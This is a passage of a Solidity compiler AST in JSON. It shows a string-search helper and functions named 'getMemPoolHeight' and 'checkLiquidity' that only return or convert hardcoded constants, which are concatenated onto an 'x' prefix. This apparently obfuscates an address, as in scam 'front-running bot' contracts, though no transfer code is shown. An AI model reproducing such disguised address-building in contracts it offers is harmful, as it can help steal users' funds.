																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								},
																								"id": 1247,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"leftExpression": {
																									"argumentTypes": null,
																									"commonType": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									},
																									"id": 1245,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"leftExpression": {
																										"argumentTypes": null,
																										"hexValue": "32",
																										"id": 1237,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "12493:1:3",
																										"subdenomination": null,
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_2_by_1",
																											"typeString": "int_const 2"
																										},
																										"value": "2"
																									},
																									"nodeType": "BinaryOperation",
																									"operator": "**",
																									"rightExpression": {
																										"argumentTypes": null,
																										"components": [
																											{
																												"argumentTypes": null,
																												"commonType": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												},
																												"id": 1243,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"leftExpression": {
																													"argumentTypes": null,
																													"hexValue": "38",
																													"id": 1238,
																													"isConstant": false,
																													"isLValue": false,
																													"isPure": true,
																													"kind": "number",
																													"lValueRequested": false,
																													"nodeType": "Literal",
																													"src": "12499:1:3",
																													"subdenomination": null,
																													"typeDescriptions": {
																														"typeIdentifier": "t_rational_8_by_1",
																														"typeString": "int_const 8"
																													},
																													"value": "8"
																												},
																												"nodeType": "BinaryOperation",
																												"operator": "*",
																												"rightExpression": {
																													"argumentTypes": null,
																													"components": [
																														{
																															"argumentTypes": null,
																															"commonType": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															},
																															"id": 1241,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"leftExpression": {
																																"argumentTypes": null,
																																"hexValue": "3332",
																																"id": 1239,
																																"isConstant": false,
																																"isLValue": false,
																																"isPure": true,
																																"kind": "number",
																																"lValueRequested": false,
																																"nodeType": "Literal",
																																"src": "12504:2:3",
																																"subdenomination": null,
																																"typeDescriptions": {
																																	"typeIdentifier": "t_rational_32_by_1",
																																	"typeString": "int_const 32"
																																},
																																"value": "32"
																															},
																															"nodeType": "BinaryOperation",
																															"operator": "-",
																															"rightExpression": {
																																"argumentTypes": null,
																																"id": 1240,
																																"name": "needlelen",
																																"nodeType": "Identifier",
																																"overloadedDeclarations": [],
																																"referencedDeclaration": 1213,
																																"src": "12509:9:3",
																																"typeDescriptions": {
																																	"typeIdentifier": "t_uint256",
																																	"typeString": "uint256"
																																}
																															},
																															"src": "12504:14:3",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														}
																													],
																													"id": 1242,
																													"isConstant": false,
																													"isInlineArray": false,
																													"isLValue": false,
																													"isPure": false,
																													"lValueRequested": false,
																													"nodeType": "TupleExpression",
																													"src": "12503:16:3",
																													"typeDescriptions": {
																														"typeIdentifier": "t_uint256",
																														"typeString": "uint256"
																													}
																												},
																												"src": "12499:20:3",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											}
																										],
																										"id": 1244,
																										"isConstant": false,
																										"isInlineArray": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"nodeType": "TupleExpression",
																										"src": "12498:22:3",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"src": "12493:27:3",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"nodeType": "BinaryOperation",
																								"operator": "-",
																								"rightExpression": {
																									"argumentTypes": null,
																									"hexValue": "31",
																									"id": 1246,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "number",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "12523:1:3",
																									"subdenomination": null,
																									"typeDescriptions": {
																										"typeIdentifier": "t_rational_1_by_1",
																										"typeString": "int_const 1"
																									},
																									"value": "1"
																								},
																								"src": "12493:31:3",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							}
																						],
																						"id": 1248,
																						"isConstant": false,
																						"isInlineArray": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "TupleExpression",
																						"src": "12492:33:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 1236,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "12483:7:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_bytes32_$",
																					"typeString": "type(bytes32)"
																				},
																				"typeName": {
																					"id": 1235,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "12483:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1250,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "12483:43:3",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "12468:58:3"
																	},
																	{
																		"assignments": [
																			1253
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1253,
																				"mutability": "mutable",
																				"name": "needledata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1287,
																				"src": "12548:18:3",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1252,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "12548:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1254,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "12548:18:3"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "12594:45:3",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "12596:41:3",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "needleptr",
																										"nodeType": "YulIdentifier",
																										"src": "12620:9:3"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "12614:5:3"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "12614:16:3"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "12632:4:3"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "12610:3:3"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "12610:27:3"
																					},
																					"variableNames": [
																						{
																							"name": "needledata",
																							"nodeType": "YulIdentifier",
																							"src": "12596:10:3"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 1234,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12632:4:3",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1253,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12596:10:3",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1215,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12620:9:3",
																				"valueSize": 1
																			}
																		],
																		"id": 1255,
																		"nodeType": "InlineAssembly",
																		"src": "12585:54:3"
																	},
																	{
																		"assignments": [
																			1257
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1257,
																				"mutability": "mutable",
																				"name": "end",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1287,
																				"src": "12660:8:3",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 1256,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "12660:4:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1263,
																		"initialValue": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1262,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 1260,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1258,
																					"name": "selfptr",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1211,
																					"src": "12671:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 1259,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1209,
																					"src": "12681:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "12671:17:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1261,
																				"name": "needlelen",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1213,
																				"src": "12691:9:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "12671:29:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "12660:40:3"
																	},
																	{
																		"assignments": [
																			1265
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1265,
																				"mutability": "mutable",
																				"name": "ptrdata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1287,
																				"src": "12719:15:3",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1264,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "12719:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1266,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "12719:15:3"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "12762:36:3",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "12764:32:3",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "ptr",
																										"nodeType": "YulIdentifier",
																										"src": "12785:3:3"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "12779:5:3"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "12779:10:3"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "12791:4:3"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "12775:3:3"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "12775:21:3"
																					},
																					"variableNames": [
																						{
																							"name": "ptrdata",
																							"nodeType": "YulIdentifier",
																							"src": "12764:7:3"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 1234,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12791:4:3",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1221,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12785:3:3",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1265,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12764:7:3",
																				"valueSize": 1
																			}
																		],
																		"id": 1267,
																		"nodeType": "InlineAssembly",
																		"src": "12753:45:3"
																	},
																	{
																		"body": {
																			"id": 1283,
																			"nodeType": "Block",
																			"src": "12849:203:3",
																			"statements": [
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 1273,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1271,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1221,
																							"src": "12876:3:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": ">=",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 1272,
																							"name": "end",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1257,
																							"src": "12883:3:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "12876:10:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 1278,
																					"nodeType": "IfStatement",
																					"src": "12872:65:3",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"commonType": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"id": 1276,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftExpression": {
																								"argumentTypes": null,
																								"id": 1274,
																								"name": "selfptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1211,
																								"src": "12920:7:3",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "BinaryOperation",
																							"operator": "+",
																							"rightExpression": {
																								"argumentTypes": null,
																								"id": 1275,
																								"name": "selflen",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1209,
																								"src": "12930:7:3",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"src": "12920:17:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 1219,
																						"id": 1277,
																						"nodeType": "Return",
																						"src": "12913:24:3"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 1280,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "UnaryOperation",
																						"operator": "++",
																						"prefix": false,
																						"src": "12960:5:3",
																						"subExpression": {
																							"argumentTypes": null,
																							"id": 1279,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1221,
																							"src": "12960:3:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1281,
																					"nodeType": "ExpressionStatement",
																					"src": "12960:5:3"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "12997:36:3",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "12999:32:3",
																								"value": {
																									"arguments": [
																										{
																											"arguments": [
																												{
																													"name": "ptr",
																													"nodeType": "YulIdentifier",
																													"src": "13020:3:3"
																												}
																											],
																											"functionName": {
																												"name": "mload",
																												"nodeType": "YulIdentifier",
																												"src": "13014:5:3"
																											},
																											"nodeType": "YulFunctionCall",
																											"src": "13014:10:3"
																										},
																										{
																											"name": "mask",
																											"nodeType": "YulIdentifier",
																											"src": "13026:4:3"
																										}
																									],
																									"functionName": {
																										"name": "and",
																										"nodeType": "YulIdentifier",
																										"src": "13010:3:3"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "13010:21:3"
																								},
																								"variableNames": [
																									{
																										"name": "ptrdata",
																										"nodeType": "YulIdentifier",
																										"src": "12999:7:3"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 1234,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "13026:4:3",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1221,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "13020:3:3",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1265,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "12999:7:3",
																							"valueSize": 1
																						}
																					],
																					"id": 1282,
																					"nodeType": "InlineAssembly",
																					"src": "12988:45:3"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			},
																			"id": 1270,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1268,
																				"name": "ptrdata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1265,
																				"src": "12826:7:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1269,
																				"name": "needledata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1253,
																				"src": "12837:10:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"src": "12826:21:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 1284,
																		"nodeType": "WhileStatement",
																		"src": "12819:233:3"
																	},
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 1285,
																			"name": "ptr",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1221,
																			"src": "13077:3:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"functionReturnParameters": 1219,
																		"id": 1286,
																		"nodeType": "Return",
																		"src": "13070:10:3"
																	}
																]
															}
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1326,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1324,
														"name": "selfptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1211,
														"src": "13609:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1325,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1209,
														"src": "13619:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "13609:17:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 1219,
												"id": 1327,
												"nodeType": "Return",
												"src": "13602:24:3"
											}
										]
									},
									"documentation": null,
									"id": 1329,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findPtr",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1216,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1209,
												"mutability": "mutable",
												"name": "selflen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1329,
												"src": "12237:12:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1208,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "12237:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1211,
												"mutability": "mutable",
												"name": "selfptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1329,
												"src": "12251:12:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1210,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "12251:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1213,
												"mutability": "mutable",
												"name": "needlelen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1329,
												"src": "12265:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1212,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "12265:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1215,
												"mutability": "mutable",
												"name": "needleptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1329,
												"src": "12281:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1214,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "12281:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "12236:60:3"
									},
									"returnParameters": {
										"id": 1219,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1218,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1329,
												"src": "12319:4:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1217,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "12319:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "12318:6:3"
									},
									"scope": 1724,
									"src": "12220:1414:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 1336,
										"nodeType": "Block",
										"src": "13700:32:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "353638353034",
													"id": 1334,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "13718:6:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_568504_by_1",
														"typeString": "int_const 568504"
													},
													"value": "568504"
												},
												"functionReturnParameters": 1333,
												"id": 1335,
												"nodeType": "Return",
												"src": "13711:13:3"
											}
										]
									},
									"documentation": null,
									"id": 1337,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolHeight",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1330,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "13668:2:3"
									},
									"returnParameters": {
										"id": 1333,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1332,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1337,
												"src": "13694:4:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1331,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "13694:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "13693:6:3"
									},
									"scope": 1724,
									"src": "13643:89:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1447,
										"nodeType": "Block",
										"src": "13941:1020:3",
										"statements": [
											{
												"assignments": [
													1343
												],
												"declarations": [
													{
														"constant": false,
														"id": 1343,
														"mutability": "mutable",
														"name": "_memPoolOffset",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1447,
														"src": "13952:28:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1342,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "13952:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1351,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "78",
															"id": 1345,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "13991:3:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_7521d1cadbcfa91eec65aa16715b94ffc1c9654ba57ea2ef1a2127bca1127a83",
																"typeString": "literal_string \"x\""
															},
															"value": "x"
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"id": 1347,
																		"name": "getMemPoolOffset",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 808,
																		"src": "14011:16:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
																			"typeString": "function () pure returns (uint256)"
																		}
																	},
																	"id": 1348,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "14011:18:3",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1346,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1149,
																"src": "13996:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1349,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "13996:34:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_7521d1cadbcfa91eec65aa16715b94ffc1c9654ba57ea2ef1a2127bca1127a83",
																"typeString": "literal_string \"x\""
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1344,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1723,
														"src": "13983:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1350,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13983:48:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13952:79:3"
											},
											{
												"assignments": [
													1353
